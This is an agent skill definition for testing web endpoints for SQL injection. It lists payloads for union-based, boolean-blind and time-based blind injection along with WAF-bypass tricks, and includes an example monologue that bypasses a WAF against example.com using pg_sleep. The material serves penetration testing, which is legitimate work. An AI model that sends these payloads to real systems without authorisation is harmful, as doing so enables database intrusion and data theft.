---
name: sql-injection
description: Test a endpoint for SQL Injection vulnerabilities
allowed-tools: http_request
---

## When to Use

- The user asks to test a endpoint for sql injection

## Available Tools

- `http_request` - Send GET, HEAD, OPTIONS, POST, PUT, PATCH, or DELETE. Returns the status code, headers, and body.

## Conventions

- Test input parameters that interact with databases
- Start with basic payloads: ', ", 1', 1", admin'--
- Try union-based injection: ' UNION SELECT 1,2,3--
- Test boolean-based blind: ' AND 1=1--, ' AND 1=2--
- Use time-based blind: '; WAITFOR DELAY '00:00:05'--
- Test error-based injection to extract information
- Try different comment styles: --, #, /* */
- Test numeric vs string contexts
- Check for WAF bypasses using encoding, case variations, and alternative syntax

Below is example monologue of an expert attempting to exploit this vulnerability. This is similar to how your testing should look,
except this doesn't include the way in which you will call tools. REMEMBER, this just an example. Do not follow these exact steps.
Use your knowledge and intuition. Think critically and be relatively innovative. Here's the example:

Target: https://example.com/products?id=123

This looks like a standard numeric ID parameter. I'll start by adding a single quote to see if I can break the SQL query.
Input: 123'
Output: HTTP 500 - Internal Server Error.
That's a great sign. The unhandled exception means the application is almost certainly vulnerable. However, a generic 500 error suggests custom errors are off, so I can't see the database error message directly. Let's try a basic UNION injection to extract some data. I'll need to figure out the number of columns first.

Input: 123' ORDER BY 3--
Output: HTTP 200 - The page loads normally.

Input: 123' ORDER BY 4--
Output: HTTP 500 - Internal Server Error.
Okay, so the query has three columns. Now let's try a UNION SELECT.

Input: 123' UNION SELECT NULL,NULL,NULL--
Output: HTTP 403 - Forbidden. A WAF page is displayed.
A WAF is blocking me. Keywords like 'UNION' and 'SELECT' are probably being filtered. Let's try to bypass it with some classic tricks. Uppercase, comments, etc.

Input: 123' uNiOn/**/sElEcT NULL,NULL,NULL--
Output: HTTP 403 - Forbidden.
The WAF is smarter than that. It's probably normalizing the input before applying its rules. Instead of fighting the WAF on keyword filters, I'll switch to a different technique. Time-based blind injection is much stealthier. The WAF might not be configured to detect it.

Input: 123' AND (SELECT pg_sleep(5))--
Output: The browser hangs for 5 seconds before the page loads.
There it is. The database executed the pg_sleep(5) function, causing a 5-second delay. This confirms it's vulnerable to SQL injection, and I can now use this technique to extract data bit by bit.
